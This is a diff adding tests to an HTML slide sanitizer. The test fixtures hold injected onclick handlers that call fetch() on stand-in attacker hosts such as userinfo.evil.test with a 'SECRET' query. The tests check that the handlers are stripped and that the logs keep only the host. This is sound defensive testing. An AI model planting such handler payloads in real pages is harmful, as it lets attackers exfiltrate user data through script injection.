@@ -241,6 +241,30 @@ test('a handler that names a host is logged host-only, in several shapes', async
   }
 })
 
+const HANDLER_LOG_EDGE_CASES: Array<[string, string, string]> = [
+  ['userinfo', `https://user:pass@userinfo.evil.test/p.png?SECRET`, 'userinfo.evil.test'],
+  ['escaped slashes', String.raw`https:\/\/escaped.evil.test/p.png?SECRET`, 'escaped.evil.test'],
+  ['single-label host', `http://localhost:43143/p.png?SECRET`, 'localhost'],
+]
+for (const [name, url, host] of HANDLER_LOG_EDGE_CASES) {
+  test(`a handler host is logged with ${name} in the URL`, async () => {
+    const { logger } = await import('./log.ts')
+    const orig = logger.warn
+    const lines: string[] = []
+    logger.warn = ((m: unknown) => void lines.push(String(m))) as typeof logger.warn
+    let out = ''
+    try {
+      out = one(`<section><p onclick="fetch('${url}')">x</p></section>`)
+    } finally {
+      logger.warn = orig
+    }
+    const all = lines.join('\n')
+    assert.ok(all.includes(`"hosts":["${host}"]`), `${url}: ${all}`)
+    assert.doesNotMatch(out, /onclick|SECRET/)
+    assert.doesNotMatch(all, /SECRET|\/p\.png/, url)
+  })
+}
+
 test('repeat reads of the same stored slide are memoized and give the same output', async () => {
   const { sanitizeDeckSlideHtml } = await import('./sanitizeDsHtml.ts')
   const html = '<section><img src="https://memo.evil.test/x.png"><p>memo</p></section>'
